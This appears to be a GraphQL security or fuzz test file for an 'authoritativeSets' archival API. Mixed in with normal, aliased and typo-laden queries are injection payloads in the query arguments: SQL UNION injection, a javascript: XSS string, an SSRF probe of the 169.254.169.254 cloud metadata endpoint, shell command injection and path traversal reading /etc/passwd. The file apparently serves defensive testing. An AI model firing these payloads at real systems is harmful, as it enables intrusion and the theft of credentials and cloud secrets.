query.query:
query authoritativeSets {
  authoritativeSets(first: 10) {
    items {
      id
      name
      itemCount
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query authoritativeSets {
  authoritativeSets(from: "1' UNION SELECT * FROM users--") {
    items {
      identifier
      description
    }
  }
}

query authoritativeSets {
  authoritativeSets(after: "javascript:alert('XSS')") {
    items {
      name
      description
    }
  }
}

query authoritativeSets {
  authoritativeSets(from: "http://169.254.169.254/latest/meta-data/") {
    items {
      links {
        targets {
          ... on AccessPoint {
            name
          }
        }
      }
    }
  }
}

query authoritativeSets {
  authoritativeSets(after: "'; cat /etc/passwd #") {
    items {
      systemEvents {
        logMessage
      }
    }
  }
}

query authoritativeSets {
  authoritativeSets(from: "../../../../etc/passwd") {
    items {
      annotations {
        body
      }
    }
  }
}

query authoritativeSets {
  authoritativeSets(after: "<h1>Database Error</h1>") {
    items {
      description
      authorities {
        items {
          descriptions {
            biographicalHistory
          }
        }
      }
    }
  }
}

query authoritativeSets {
  authoritativeSets {
    items {
      id
      type
      authorities {
        items {
          descriptions {
            source
          }
        }
      }
    }
  }
}

query s: authoritativeSets {
  s: authoritativeSets {
    i: items {
      id
      t: type
      a: authorities {
        i: items {
          d: descriptions {
            s: source
          }
        }
      }
    }
  }
}

query {
  authoritativeSets {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

query authoritativeSets {
  authoritativeSets {
    itms {  # Intentional typo
      id
      nme  # Typo
    }
  }
}
